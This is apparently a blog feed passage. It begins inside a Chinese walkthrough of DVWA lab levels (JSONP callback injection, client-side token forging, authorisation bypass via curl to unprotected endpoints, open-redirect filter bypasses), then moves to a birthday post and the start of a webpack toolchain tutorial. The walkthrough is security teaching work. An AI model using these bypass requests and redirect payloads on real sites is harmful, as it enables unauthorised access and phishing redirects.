&lt;p&gt;其实目的是为了拿到其中的 JSON 数据，但是以调用函数的代码形式返回，外面这层函数就叫做 padding，故名曰 JSON with Padding。&lt;/p&gt;
&lt;p&gt;然而，JSONP 将调用传入的 callback 参数，这个函数是前端传入的。我们只要重新定义 callback 参数的内容，就能让页面执行我们想要的 JavaScript 代码。比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function clickButton() {
    var s = document.createElement(&amp;quot;script&amp;quot;);
    s.src = &amp;quot;source/jsonp.php?callback=alert&amp;quot;;
    document.body.appendChild(s);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：硬编码函数名&lt;/h3&gt;
&lt;p&gt;这一等级仍然使用 JSONP，但是不读取 callback 的值，而是将 solveSum 这一函数名硬编码进 &lt;code&gt;jsonp.php&lt;/code&gt;。这才是使用 JSONP 的正确方式。&lt;/p&gt;
&lt;h2&gt;JavaScript Attacks&lt;/h2&gt;
&lt;p&gt;这一关提供了一个表单，我们可以提交一个 phase，同时前端计算了 &lt;code&gt;ChangeMe&lt;/code&gt; 这个 phase 的哈希，后端验证哈希是否匹配。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;成功提交 &lt;code&gt;success&lt;/code&gt; 这个单词，并通过哈希验证。&lt;/p&gt;
&lt;h3&gt;Low：内联脚本&lt;/h3&gt;
&lt;p&gt;如果直接提交 &lt;code&gt;success&lt;/code&gt; 会提示 Invalid token。显然，表单里有个隐藏的 token。&lt;/p&gt;
&lt;p&gt;‍查看 HTML，能找到表单后的一段 script：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function rot13(inp) {
  return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c&amp;lt;=&amp;quot;Z&amp;quot;?90:122)&amp;gt;=(c=c.charCodeAt(0)+13)?c:c-26);});
}

function generate_token() {
  var phrase = document.getElementById(&amp;quot;phrase&amp;quot;).value;
  document.getElementById(&amp;quot;token&amp;quot;).value = md5(rot13(phrase));
}

generate_token();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当页面打开时，该脚本将输入框中的内容通过某种方式算出 MD5 作为 token。可以猜到，后端肯定是检查了 token 和 phase 是否匹配。然而当页面刚加载时 phase 是 &lt;code&gt;ChangeMe&lt;/code&gt;，除非直接提交 &lt;code&gt;ChangeMe&lt;/code&gt;，其他任何 phase 都会显示 Invalid token。&lt;/p&gt;
&lt;p&gt;既然前端代码都能看见了，对 &lt;code&gt;success&lt;/code&gt; 这个 phase 也用这种方式计算出其 MD5 就行了。其实，只要输入 &lt;code&gt;success&lt;/code&gt;，然后在 console 里调用 &lt;code&gt;generate_token()&lt;/code&gt;，就会计算出对应的 token，提交即可。&lt;/p&gt;
&lt;h3&gt;Medium：外部脚本，简单混淆&lt;/h3&gt;
&lt;p&gt;和 low 的区别在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不在 HTML 中内联 JavaScript，而是加载外部的 js 文件。&lt;/li&gt;
&lt;li&gt;JavaScript 脚本做了简单的混淆，所有函数名、变量名都用了和代码含义无关的命名。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function do_something(e) {
    for (var t = &amp;quot;&amp;quot;, n = e.length - 1; n &amp;gt;= 0; n--)
        t += e[n];
    return t
}
setTimeout(function() {
    do_elsesomething(&amp;quot;XX&amp;quot;)
}, 300);
function do_elsesomething(e) {
    document.getElementById(&amp;quot;token&amp;quot;).value = do_something(e + document.getElementById(&amp;quot;phrase&amp;quot;).value + &amp;quot;XX&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;好在混淆后的代码也并不难懂，页面加载后延时 300ms 调用 &lt;code&gt;do_elsesomething&lt;/code&gt; 函数计算 token。我们仍然只要输入 &lt;code&gt;success&lt;/code&gt; 后在 console 里调用 &lt;code&gt;do_elsesomething(&amp;quot;XX&amp;quot;)&lt;/code&gt; 再提交即可。&lt;/p&gt;
&lt;h3&gt;High：高级混淆&lt;/h3&gt;
&lt;p&gt;和 medium 相比，这次代码做了充分的混淆，使代码几乎不可读。仔细观察，这段代码里用了 &lt;code&gt;eval&lt;/code&gt; 函数。代码&lt;strong&gt;先构造出要执行的 JavaScript 代码&lt;/strong&gt;，然后使用 &lt;code&gt;eval&lt;/code&gt; 执行。&lt;/p&gt;
&lt;p&gt;既然构造出的代码要被执行，那能不能被我们看到呢？答案是肯定的。&lt;/p&gt;
&lt;p&gt;在 F12 里选中 Submit 按钮，可以看到其 click 事件绑定了一个函数，这个函数来源于 VM8084:1：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/4124032546.png&quot; alt=&quot;F12 console 里看到的事件绑定&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个 VM 指的是 V8 引擎为&lt;strong&gt;没有对应来源的 JavaScript&lt;/strong&gt; 创造的虚拟机环境。对于有对应来源的脚本，这个地方本来会显示源文件地址。&lt;/p&gt;
&lt;p&gt;进入这个 VM8084:1，就能看到脚本构造出的可读 JavaScript 代码。看来，之前的代码混淆相当于没有作用了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;document.getElementById(&amp;quot;phrase&amp;quot;).value = &amp;quot;&amp;quot;;
setTimeout(function() {
    token_part_2(&amp;quot;XX&amp;quot;)
}, 300);
document.getElementById(&amp;quot;send&amp;quot;).addEventListener(&amp;quot;click&amp;quot;, token_part_3);
token_part_1(&amp;quot;ABCD&amp;quot;, 44);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;显然，代码按照顺序调用了三个 &lt;code&gt;token_part&lt;/code&gt; 函数。我们也仿照这个流程进行即可。&lt;/p&gt;
&lt;p&gt;将输入框中内容改为 &lt;code&gt;success&lt;/code&gt;，然后在 console 中调用：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;token_part_1(&amp;quot;ABCD&amp;quot;, 44);
token_part_2(&amp;quot;XX&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后点击 Submit（绑定的 Event Listener 会调用 &lt;code&gt;token_part_3&lt;/code&gt;），就能完成提交。&lt;/p&gt;
&lt;h3&gt;Impossible：不要相信前端发来的任何数据&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;永远不要相信前端发来的任何数据，不管在前端用了怎样的 JavaScript 处理。对于这个问题，没有 impossible 的解决方案。&lt;/p&gt;
&lt;h2&gt;Authorisation Bypass&lt;/h2&gt;
&lt;p&gt;在这关里，提供了一个用户管理列表，但是只有管理员用户 admin 可以访问。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;作为非管理员用户，实现用户管理的功能。&lt;/p&gt;
&lt;p&gt;完成这关时，必须以非管理员用户登录 DVWA，例如名为 gordonb（密码 abc123）的用户。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;通过 gordonb 用户登录，会发现左侧 Authorisation Bypass 这一关消失了。&lt;/p&gt;
&lt;p&gt;然而，不难发现每一关对应一个子路径。依然可以通过这个 URL 进入用户管理：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/authbypass/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;没有做任何的鉴权，只要进入页面就有修改编辑用户的权限。&lt;/p&gt;
&lt;h3&gt;Medium：UI 不让进，接口还能用&lt;/h3&gt;
&lt;p&gt;通过 low 的方式，可以发现进不去这一关了，提示「Unauthorised」。&lt;/p&gt;
&lt;p&gt;然而，我们还是可以先研究研究这关的源码，在这个地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/view_source.php?id=authbypass&amp;amp;security=medium
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;
&amp;lt;?php
/*

Only the admin user is allowed to access this page.

Have a look at these two files for possible vulnerabilities: 

* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php

*/

if (dvwaCurrentUser() != &amp;quot;admin&amp;quot;) {
    print &amp;quot;Unauthorised&amp;quot;;
    http_response_code(403);
    exit;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看起来这个页面是进不去了。根据提示，可以发现通过 &lt;code&gt;get_user_data.php&lt;/code&gt; 文件还是可以获取用户信息，访问下面这个 URL 能获取所有用户信息的 JSON：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/authbypass/get_user_data.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也就是说没有做接口的鉴权，只做了 UI 的鉴权。&lt;/p&gt;
&lt;p&gt;同样地，可以通过 &lt;code&gt;change_user_details.php&lt;/code&gt; 更新用户信息：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl &apos;http://localhost/vulnerabilities/authbypass/change_user_details.php&apos; \
  -H &apos;Accept: application/json&apos; \
  -H &apos;Content-Type: application/json&apos; \
  -H &apos;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=medium; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&apos; \
  -H &apos;Origin: http://localhost&apos; \
  --data-raw &apos;{&amp;quot;id&amp;quot;:2,&amp;quot;first_name&amp;quot;:&amp;quot;Gordon&amp;quot;,&amp;quot;surname&amp;quot;:&amp;quot;Brown1&amp;quot;}&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过这两个接口，虽然进不去管理员 UI，但是能获得相同的功能。&lt;/p&gt;
&lt;h3&gt;High：修改接口仍可用&lt;/h3&gt;
&lt;p&gt;和 medium 相比，&lt;code&gt;get_user_data.php&lt;/code&gt; 做了鉴权，但是 &lt;code&gt;change_user_details.php&lt;/code&gt; 没有。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl &apos;http://localhost/vulnerabilities/authbypass/change_user_details.php&apos; \
  -H &apos;Accept: application/json&apos; \
  -H &apos;Content-Type: application/json&apos; \
  -H &apos;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=high; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&apos; \
  -H &apos;Origin: http://localhost&apos; \
  --data-raw &apos;{&amp;quot;id&amp;quot;:2,&amp;quot;first_name&amp;quot;:&amp;quot;Gordon&amp;quot;,&amp;quot;surname&amp;quot;:&amp;quot;Brown2&amp;quot;}&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个等级想要模拟的是愚蠢的开发者漏掉了这个接口的鉴权。&lt;/p&gt;
&lt;h3&gt;Impossible：全部鉴权&lt;/h3&gt;
&lt;p&gt;对 &lt;code&gt;change_user_details.php&lt;/code&gt; 文件也加上鉴权。至此所有页面、接口都需要认证才能使用了。&lt;/p&gt;
&lt;h2&gt;Open HTTP Redirect&lt;/h2&gt;
&lt;p&gt;这一关里，给出的 URL 中通过给指定页面的参数，让页面为我们重定向。该情境的本意是只能重定向到指定的两个页面。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标：&lt;/strong&gt;使之重定向到任何我们想要的页面。&lt;/p&gt;
&lt;h3&gt;Low：直接重定向&lt;/h3&gt;
&lt;p&gt;无脑将 &lt;code&gt;redirect&lt;/code&gt; 参数作为 &lt;code&gt;location.href&lt;/code&gt; 的值。可以重定向到任何网站：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Medium：不能含有协议名&lt;/h3&gt;
&lt;p&gt;判断目标 URL 中是否包含 &lt;code&gt;http://&lt;/code&gt; 或者 &lt;code&gt;https://&lt;/code&gt;，如果包含则拒绝重定向。&lt;/p&gt;
&lt;p&gt;表示 URL 时，如果没有明确指定协议，直接以 &lt;code&gt;//&lt;/code&gt; 开头，则表示使用和当前页面相同的协议。现在绝大部分网站又都支持将 HTTP 重定向到 HTTPS。所以，只需要：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/open_redirect/source/medium.php?redirect=//www.baidu.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;High：必须包含子串&lt;/h3&gt;
&lt;p&gt;目标 URL 中必须包含 &lt;code&gt;info.php&lt;/code&gt; 这个子串，否则拒绝重定向。&lt;/p&gt;
&lt;p&gt;这也很好绕过，最简洁的方式就是加一个没用的 param：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/open_redirect/source/high.php?redirect=https://www.baidu.com?a=info.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：白名单&lt;/h3&gt;
&lt;p&gt;最终，最安全的方式还是白名单。这一等级直接判断目标是 &lt;code&gt;info.php?id=1&lt;/code&gt; 或者 &lt;code&gt;info.php?id=2&lt;/code&gt;，其他一概拒绝。&lt;/p&gt;
&lt;h2&gt;总结：Web 安全的一些最佳实践&lt;/h2&gt;
&lt;p&gt;根据以上漏洞的尝试和探索，可以得出这些 Web 安全的最佳实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;白名单比黑名单更安全。&lt;/li&gt;
&lt;li&gt;不要相信前端发来的任何数据。&lt;/li&gt;
&lt;li&gt;不要在 HTML 或 SQL 里插入没有转义过的 string。&lt;/li&gt;
&lt;li&gt;不想让用户知道的处理逻辑，就放到后端。不要尝试在前端「隐藏代码」，这是不可能的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开发 Web 应用过程中可能有无数的坑，而踩到了安全方面的坑则特别可能带来极大的损失。最重要的是，在设计和开发的过程中要有充分的&lt;strong&gt;安全意识&lt;/strong&gt;，避免各种形式的不良实践。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>✨ 二十一岁，繁花盛开。</title><link>https://skywt.cn/blog/twenty-one-years-old/</link><guid isPermaLink="true">https://skywt.cn/blog/twenty-one-years-old/</guid><description>二十一岁了，到了小时候觉得很遥远的年纪。

</description><pubDate>Sun, 07 Apr 2024 07:17:00 GMT</pubDate><content:encoded>&lt;p&gt;二十一岁了，到了小时候觉得很遥远的年纪。&lt;/p&gt;
&lt;!--more--&gt;
&lt;p&gt;不知道是什么时候形成的习惯，每年生日都会发一篇博客，纪念这一岁的自己。翻到以往生日发的博客，更加能感叹时光之流逝，自己的成长。对于二十一岁，我还一点都没有准备好。&lt;/p&gt;
&lt;p&gt;每年生日，正好都是清明时节。长沙的春日，繁花盛开了。&lt;/p&gt;
&lt;p&gt;二十一岁，也正是繁花盛开的年纪。是时候开始具体地思考这个问题：「&lt;strong&gt;你想活出怎样的人生？&lt;/strong&gt;」&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/04/2703891426.jpeg&quot; alt=&quot;我认识的大多数年长的鼹鼠，都希望自己当初能够听从梦想，而非恐惧。&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我认识的大多数年长的鼹鼠，都希望自己当初能够听从梦想，而非恐惧。&lt;br&gt;
——《男孩、鼹鼠、狐狸和马》&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>从零开始，配置一套现代前端工具链</title><link>https://skywt.cn/blog/configure-a-modern-frontend-toolchain-from-scratch/</link><guid isPermaLink="true">https://skywt.cn/blog/configure-a-modern-frontend-toolchain-from-scratch/</guid><description>现代前端应用框架（如 Next.js、Nuxt.js 等）都直接集成了完整的工具链，按照官方文档做，一行命令就可以配置完毕。这整套工具在我们调试和构建项目时，在背后做了大量工作。虽然这有助于快速上手，但是非常不利于我们了解其中的原理。

然而，各种工具纷繁复杂，文档浩如烟海。由于工具之多，即使文档再友好、工具本身再易用，也很难快速入门。

**本文将带你踏上一段旅程，从一个空文件夹开始，一步一步添加工具，最终配置一套完整的前端工具链。**在其中，我们可以对各个工具的概念、用途和原理有一个比较系统的认识。每个部分都列出了相关文档的链接，方便查阅。

</description><pubDate>Sat, 16 Mar 2024 07:31:00 GMT</pubDate><content:encoded>&lt;p&gt;现代前端应用框架（如 Next.js、Nuxt.js 等）都直接集成了完整的工具链，按照官方文档做，一行命令就可以配置完毕。这整套工具在我们调试和构建项目时，在背后做了大量工作。虽然这有助于快速上手，但是非常不利于我们了解其中的原理。&lt;/p&gt;
&lt;p&gt;然而，各种工具纷繁复杂，文档浩如烟海。由于工具之多，即使文档再友好、工具本身再易用，也很难快速入门。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文将带你踏上一段旅程，从一个空文件夹开始，一步一步添加工具，最终配置一套完整的前端工具链。&lt;/strong&gt;在其中，我们可以对各个工具的概念、用途和原理有一个比较系统的认识。每个部分都列出了相关文档的链接，方便查阅。&lt;/p&gt;
&lt;!--more--&gt;
&lt;p&gt;我们使用 &lt;strong&gt;React.js&lt;/strong&gt; 前端框架，使用 &lt;strong&gt;Tailwind&lt;/strong&gt; 编写 CSS，使用 &lt;strong&gt;TypeScript&lt;/strong&gt; 编写脚本，并使用 &lt;strong&gt;ESLint&lt;/strong&gt; 进行代码检查。最终，希望达到和使用 create-react-app 工具创建的项目类似的开发体验。&lt;/p&gt;
&lt;h2&gt;TL；DR&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;配置完毕后，整套工具链的示意图如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/03/543791890.png&quot; alt=&quot;配置完毕后的工具链示意图&quot;&gt;&lt;/p&gt;
&lt;h2&gt;从创建一个 npm 项目开始&lt;/h2&gt;
&lt;p&gt;创建一个空目录（一般目录名就是项目名），进入其中执行 &lt;code&gt;npm init&lt;/code&gt;，这个命令会交互式地让你填写该项目的元信息。&lt;/p&gt;
&lt;p&gt;我们将这个项目命名为 &lt;strong&gt;study-chain&lt;/strong&gt;（意为 study frontend toolchain）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkdir study-chain
cd study-chain
npm init
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;确认信息之后，目录下会生成 &lt;code&gt;package.json&lt;/code&gt; 文件，记录了项目的元信息：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;// package.json
{
  &amp;quot;name&amp;quot;: &amp;quot;study-chain&amp;quot;,
  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
  &amp;quot;description&amp;quot;: &amp;quot;&amp;quot;,
  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
  &amp;quot;scripts&amp;quot;: {
    &amp;quot;test&amp;quot;: &amp;quot;echo \&amp;quot;Error: no test specified\&amp;quot; &amp;amp;&amp;amp; exit 1&amp;quot;
  },
  &amp;quot;author&amp;quot;: &amp;quot;SkyWT&amp;quot;,
  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来，我们以 &lt;strong&gt;moment&lt;/strong&gt; 模块为例，这是一个用于转换日期格式的模块（这个模块其实已经废弃，不推荐新项目使用。我们只是将其作为示例，参见&lt;a href=&quot;https://momentjs.com/docs/&quot;&gt;文档&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;在项目根目录下，使用 &lt;code&gt;npm i&lt;/code&gt; 安装模块：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i moment
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们只使用这个模块的一个功能为例：将模块引入为 &lt;code&gt;moment&lt;/code&gt; 之后，&lt;code&gt;moment().format()&lt;/code&gt; 返回当前日期时间字符串。&lt;/p&gt;
&lt;h2&gt;Webpack&lt;/h2&gt;
&lt;p&gt;让我们先忘掉 React.js，从编写纯 HTML 和 JavaScript 开始。&lt;strong&gt;如何在这个项目里使用之前安装的 moment 模块呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;考虑编写一个简单的 HTML 文件 &lt;code&gt;index.html&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;script src=&amp;quot;./index.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个 HTML 引用了 &lt;code&gt;index.js&lt;/code&gt;。这个 js 文件引入了 moment 模块，将 div 内的内容设置为当前时间：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// index.js
const moment = require(&amp;quot;moment&amp;quot;);

const app = document.getElementById(&amp;quot;app&amp;quot;);
app.innerText = moment().format();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;当然，如果此时在浏览器中打开 HTML，这段 js 是无法运行的。&lt;/strong&gt;因为 require 是 Node.js 的语法，浏览器并不支持。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但是我们知道这个模块就在本地&lt;/strong&gt;，它的源文件就在 &lt;code&gt;node_modules/moment&lt;/code&gt; 路径下。我们需要一个工具&lt;strong&gt;获取这个模块，整合进这段 js 里&lt;/strong&gt;。这种工具就叫做 &lt;strong&gt;bundler&lt;/strong&gt;。有了 bundler，即使在用于前端的 js 中，我们也能引入模块了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Webpack&lt;/strong&gt; 就是其中之一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;类似的工具有：&lt;/strong&gt;Rollup、Parcel。&lt;/p&gt;
&lt;h3&gt;安装与使用&lt;/h3&gt;
&lt;p&gt;首先安装 webpack 和 webpack-cli。后者是配套的命令行工具。这两个工具都只是在开发阶段使用，所以使用 &lt;code&gt;--save-dev&lt;/code&gt; 安装为开发环境依赖：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i webpack webpack-cli --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;安装后，可以直接使用 &lt;code&gt;npx webpack&lt;/code&gt; 命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npx webpack ./index.js --mode=development
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个命令处理 &lt;code&gt;index.js&lt;/code&gt; 文件，解析其中引用的模块，将对应的 js 代码注入该文件。参数 &lt;code&gt;--mode=development&lt;/code&gt; 指示生成开发环境下易于调试的文件版本。如果在生产环境，应使用 &lt;code&gt;--mode=production&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;运行之后，会生成 &lt;code&gt;dist/main.js&lt;/code&gt;（这是默认的输出文件，可配置），这就相当于&lt;strong&gt;浏览器版&lt;/strong&gt;的源文件。于是，修改 HTML 中引用的 script 路径：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;script src=&amp;quot;./dist/main.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用浏览器打开，可以发现成功地调用了该模块，div 中显示了当前的日期时间。&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;--watch&lt;/code&gt; 参数可以使 webpack 保持运行，持续监听源文件的修改：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npx webpack ./index.js --mode=development --watch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行时，每当编辑 &lt;code&gt;index.js&lt;/code&gt; 并保存，都会自动重新生成 &lt;code&gt;dist/main.js&lt;/code&gt; 文件。可以在终端看到对应的输出。&lt;/p&gt;
&lt;p&gt;除了 &lt;code&gt;require&lt;/code&gt; 语法，webpack 也支持更常用的 &lt;code&gt;import&lt;/code&gt; 语法。刚才的引入模块语句可以改成：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// index.js
import moment from &amp;quot;moment&amp;quot;;
// ...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;配置文件 webpack.config.js&lt;/h3&gt;
&lt;p&gt;使用 webpack 的配置文件，可以替代运行命令时传递的参数，让命令行的使用更简洁和灵活。（&lt;a href=&quot;https://webpack.js.org/configuration/&quot;&gt;相关文档&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;在项目根目录创建名为 &lt;code&gt;webpack.config.js&lt;/code&gt; 的文件，内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
const path = require(&amp;quot;path&amp;quot;);
module.exports = {
  mode: &apos;development&apos;,
  entry: &apos;./index.js&apos;,
  output: {
    filename: &apos;main.js&apos;,
    path: path.resolve(__dirname, &amp;quot;dist&amp;quot;)
  }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;创建了配置文件之后，使用命令行时，只需要使用如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npx webpack
npx webpack --watch
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;设置 npm scripts&lt;/h3&gt;
&lt;p&gt;为了方便起见，可以将以上 webpack 命令设置为 &lt;strong&gt;npm scripts&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;编辑 &lt;code&gt;package.json&lt;/code&gt; 文件，添加 scripts：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;// package.json
{
  // ...
  &amp;quot;scripts&amp;quot;: {
    &amp;quot;build&amp;quot;: &amp;quot;webpack&amp;quot;,
    &amp;quot;watch&amp;quot;: &amp;quot;webpack --watch&amp;quot;
  },
  // ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;保存之后，只需使用如下命令，就等同于运行设置的 webpack 命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm run build
npm run watch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了表述方便，下文将运行 &lt;code&gt;npm run build&lt;/code&gt; 命令的这一操作简称为 build。&lt;/p&gt;
&lt;h3&gt;生成 HTML&lt;/h3&gt;
&lt;p&gt;现在，构建完成后，访问 &lt;code&gt;index.html&lt;/code&gt; 就能看到我们的网站。然而可以发现，这个 HTML 中 &lt;code&gt;main.js&lt;/code&gt; 需要我们手动引用。能否让 webpack 帮我们完成这件事情呢？&lt;/p&gt;
&lt;p&gt;这就需要让 webpack 为我们在 &lt;code&gt;dist&lt;/code&gt; 目录中&lt;strong&gt;生成 HTML 文件&lt;/strong&gt;。这可以通过 &lt;strong&gt;html-webpack-plugin&lt;/strong&gt; 这个插件实现。没错，&lt;strong&gt;webpack 不仅是一个打包工具，其还拥有着丰富的插件生态&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;运行以下命令安装 html-webpack-plugin（&lt;a href=&quot;https://webpack.js.org/plugins/html-webpack-plugin/&quot;&gt;文档&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm i html-webpack-plugin --save-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将 &lt;code&gt;index.html&lt;/code&gt; 重命名为 &lt;code&gt;template.html&lt;/code&gt;，内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接下来修改 &lt;code&gt;webpack.config.js&lt;/code&gt;，添加 html-webpack-plugin 插件的配置：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// webpack.config.js
const HtmlWebpackPlugin = require(&amp;quot;html-webpack-plugin&amp;quot;);
// ...
module.exports = {
  // ...
  plugins: [
    new HtmlWebpackPlugin({
      template: &amp;quot;template.html&amp;quot;
    })
  ]
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再次使用 build 构建，会发现 &lt;code&gt;dist&lt;/code&gt; 目录下生成了 &lt;code&gt;index.html&lt;/code&gt;，这个 HTML 引用了生成的 &lt;code&gt;main.js&lt;/code&gt; 脚本。打开就能看见其实现了我们要的应用逻辑。&lt;/p&gt;
&lt;h3&gt;使代码可以 import CSS 文件&lt;/h3&gt;
&lt;p&gt;现在，有了 webpack 的加持，我们的 js 代码已经可以导入 module 了。但是如果需要引入其他静态资源，比如 CSS 文件，还是无法直接完成。为了使代码能直接 import 其他类型的文件，&lt;strong&gt;webpack 中可以安装配置一种称为 loader 的模块&lt;/strong&gt;。&lt;/p&gt;
